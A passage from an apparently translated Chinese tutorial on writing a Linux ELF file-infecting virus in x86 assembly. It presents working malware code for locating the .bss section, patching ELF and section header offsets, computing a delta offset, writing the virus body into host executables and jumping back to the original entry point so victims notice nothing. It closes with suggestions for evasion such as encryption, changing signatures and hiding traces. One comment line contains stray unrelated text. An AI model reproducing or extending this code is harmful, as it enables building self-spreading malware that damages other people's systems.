        ;+10    sh_offset   节在文件中到偏移
        ;+14    sh_size zara white phone numba
        ;+18    sh_link根据节类型
        ;+1c    sh_info 根据节类型
        ;+20    sh_addralign    对齐
        ;+24    sh_entsize  当节包含固定长度的入口时被使用
        add ax， word [edi+2080+46]
        cmp ecx， 0
        jbe finish_infection        ; 找不到.bss节。  不需要担心，可以完成感染
        sub ecx， 1                  ; 计数减一
        mov ebx， dword [edi+2080+eax+4]     ; shdr->type （节类型）
        cmp ebx， 0x00000008         ; 0x08是 NOBITS，.bss节的指标
        jne section_header_loop     ; 不是.bss节
        mov ebx， dword [edi+2080+eax+12]    ; shdr->addr （内存虚拟地址）
        add ebx， v_stop - v_start   ; 增加我们病毒的长度给 shdr->addr
        add ebx， 7                  ; 为了跳转到起始入口点
        mov [edi+2080+eax+12]， ebx  ; 用新的覆盖旧的shdr->addr（在缓冲区里）
        mov edx， dword [edi+2080+eax+16]    ; shdr->offset （节的偏移）
        add edx， v_stop - v_start   ; 增加我们病毒的长度给shdr->offset
        add edx， 7                  ; 为了跳转到起始入口点
        mov [edi+2080+eax+16]， edx  ; 用新的覆盖旧的shdr->offset（在缓冲区里）
我们还需要修改.bss节头。我们可以通过检查类型标志NOBITS说这是否是一个节头。节头不一定需要为了运行可执行文件而存在。所以如果我们不能找到它，也没什么大不了的，我们仍然可以继续进行：
``
    ;dword [edi+2080+24]       ; ehdr->entry （入口点的虚拟地址）
    ;dword [edi+2080+28]       ; ehdr->phoff （程序头便宜）
    ;dword [edi+2080+32]       ; ehdr->shoff （节头偏移）
    ;word [edi+2080+40]        ; ehdr->ehsize （elf头的长度）
    ;word [edi+2080+42]        ; ehdr->phentsize （一个程序头入口的长度）
    ;word [edi+2080+44]        ; ehdr->phnum （程序头入口的数量）
    ;word [edi+2080+46]        ; ehdr->shentsize （一个节头入口的长度）
    ;word [edi+2080+48]        ; ehdr->shnum （程序头入口的数量）
    mov eax， v_stop - v_start       ; 我们病毒的长度减去到原始入口点的跳转
    add eax， 7                      ; 为了到原始入口点的跳转
    mov ebx， dword [edi+2080+32]    ; 原始节头偏移
    add eax， ebx                    ; 增加原始节头偏移
    mov [edi+2080+32]， eax      ; 用新的覆盖旧的shdr->offset（在缓冲区里）
然后，当然我们需要通过修改节头偏移对ELF头作最后修改，因为我们感染data段的尾端（bss之前）。程序头保持在同一位置：
    ;dword [edi+2080+24]       ; ehdr->entry (virtual address of entry point)
    ;dword [edi+2080+28]       ; ehdr->phoff (program header offset)
    ;dword [edi+2080+32]       ; ehdr->shoff (section header offset)
    ;word [edi+2080+40]        ; ehdr->ehsize (size of elf header)
    ;word [edi+2080+42]        ; ehdr->phentsize (size of one program header entry)
    ;word [edi+2080+44]        ; ehdr->phnum (number of program header entries)
    ;word [edi+2080+46]        ; ehdr->shentsize (size of one section header entry)
    ;word [edi+2080+48]        ; ehdr->shnum (number of program header entries)
    mov eax, v_stop - v_start       ; size of our virus minus the jump to original entry point
    add eax, 7                      ; for the jmp to original entry point
    mov ebx, dword [edi+2080+32]    ; the original section header offset
    add eax, ebx                    ; add the original section header offset
    mov [edi+2080+32], eax      ; overwrite the old section header offset with the new one (in buffer)
最后一步是注入病毒的实体代码，并完成回到宿主代码入口点的跳转指令，以便我们毫无戒心的用户看到宿主程序运行正常。
你可能会问自己的问题是，病毒如何抓取自己的代码？病毒是如何确定自己的长度呢？这些都是很好的问题。首先，我使用标签来标记病毒的开始和结束，然后使用简单的数学偏移：
``
    section .text
        global v_start
    v_start：
        ; 病毒体开始
    ...
    ...
    ...
    ...
    v_stop：
        ; 病毒体结束
        mov eax， 1      ; sys_exit
        mov ebx， 0      ; 正常状态
        int 80h
通过这样做，我可以使用v_start作为病毒开始的偏移量，然后可以使用v_stop-v_start作为字节数量（长度）。
``
    mov eax， 4
    mov ecx， v_start        ; 附加病毒部分
    mov edx， v_stop - v_start   ; 病毒字节的长度
    int 80h
病毒的长度（v_stop – v_start）比较好计算，但是在第一次感染后病毒代码的开头（mov ecx,
v_start）引用将会失败。事实上，任何绝对地址的引用都将会失败，因为不同宿主程序的内存位置都会发生改变。像v_start这种标签的绝对地址是在编译期间计算好的，而那取决于它如何被调用。你使用的正常短跳转如jmp、jne、jnz等都将被转换为相对于当前指令的偏移，不过像MOV这类标签的地址就不会变。我们需要的是一个delta偏移量。delta偏移量就是从原始病毒当前宿主文件的虚拟地址差值。那么如何得到delta偏移量呢？这有一个我从90年初的DOS病毒教程“Dark
Angel’s Phunky Virus Guide”里学来的一个非常简单的技巧：
``
        call delta_offset
    delta_offset：
        pop ebp                 
        sub ebp， delta_offset
通过在当前位置调用一个标签，当前指令的指针（绝对地址）就会被压入栈以方便你可以知道你RET返回到哪里。我们只要把这个值从堆栈里弹出来就能获得当前指令的指针。然后通过从当前地址减去原始病毒的绝对地址，我们就在EBP里获得了delta偏移量！在原病毒执行期间delta偏移量将为0。
你会注意到，为了规避某些障碍，我们调用没有RET的CALL，反之亦然。我建议你尽量不要在这个项目以外的地方这样做，因为很显然，丢失一个call/ret对将会导致性能损失…但现在不是正常的情况。
现在我们有了delta偏移量，让我们切换v_start的引用为delta偏移量版本：
    mov eax， 4
    lea ecx， [ebp + v_start]    ; 附加病毒部分 （用delta偏移计算）
    mov edx， v_stop - v_start   ; 病毒数据的长度
    int 80h
注意到我并没有在病毒里包含系统退出调用。这是因为我不想让病毒在执行宿主代码之前退出。相反，我把这部分替换为跳转到原始宿主的代码。由于不同宿主程序入口点会有所不同，我需要动态生成它然后直接注入操作码。为了找出操作码，你必须首先了解JMP指令本身的特点。JMP指令将试图通过计算到目的地址的偏移做一个相对跳转。我们要给它一个绝对位置。我通过汇编一个小程序里面的JMP短跳转和JMP远跳转算出了它们的十六进制操作码。JMP
操作码从E9变到FF。
    mov ebx， 0x08048080
    jmp ebx 
    jmp 0x08048080
汇编后，我运行“xxd”然后检查字节数据就知道如何将它翻译成操作码了。
    pop edx                 ; 宿主程序的原始入口点
    mov [edi]， byte 0xb8        ; MOV EAX的操作码 （1 byte）
    mov [edi+1]， edx            ; 原始入口点 （4 bytes）
    mov [edi+5]， word 0xe0ff    ; JMP EAX操作码 （2 bytes）
MOV一个双字到寄存器EAX最终被表示为B8 xx xx xx xx。JMP到存储在寄存器EAX里地址的指令最终被表示为FF E0
上面总共有7个额外字节添加到病毒的结尾。这也意味着，我们修改的每个偏移和文件长度必须加入这额外的7个字节。
因此我的病毒在缓冲区里的头部做了修改（而不是在文件），然后用修改的缓冲区覆盖宿主文件直到我们病毒代码驻留的偏移位置。然后插入它本身（vstart，vstop-vstart）再继续写缓冲区字节的其余部分，最后转接程序控制权给原始宿主文件。
一旦我汇编了病毒，我想在病毒的第8字节处手动添加病毒标记。这在我的示例中可能不是必要的，因为我的病毒会跳过目标如果它没有一个DATA段的话，但实际也不会非总是这样。打开你最喜欢的十六进制编辑器并添加这些字节吧！
现在我们完成了，让我们来汇编并测试它：nasm -f elf -F dwarf -g virus.asm && ld -m elf_i386 -e
v_start -o virus.o
我录了一个测试视频。这里面我听起来像是有点缺乏热情，只是因为现在是深夜，实际上我是欣喜若狂的。
既然你已经完成了阅读，这里就贴上我过度评论的病毒源代码链接：
这是一个非常简单的ELF感染病毒。它也可以通过非常简单的调整进行改进：
——从ELF头中提取更多的信息（32或64位、可执行文件等）
——在targetfile缓冲区后分配文件缓冲区。为什么？因为当我们获得targetfile缓冲区时就不再使用文件缓冲区了，我们可以为来获得一个更大的targetfile缓冲区而溢出文件缓冲区。
——遍历目录，这也可以通过一些稍微复杂的调整来改善：
——稍微覆盖我们的行踪更好地隐形
——加密!
——改变特征
——使用更难检测的方法去感染
好了，这就是献给大家的全部内容了。
**总结**
通过读这篇文章，我希望你也能够获得一些关于启发式病毒检测知识（而不需要搜索特定病毒特征）。也许这将是改天的主题。或者我将介绍OSX病毒…也许我会做一些蹩脚的事情并演示一个Nodejs病毒。
我们将会看到的，现在再见了。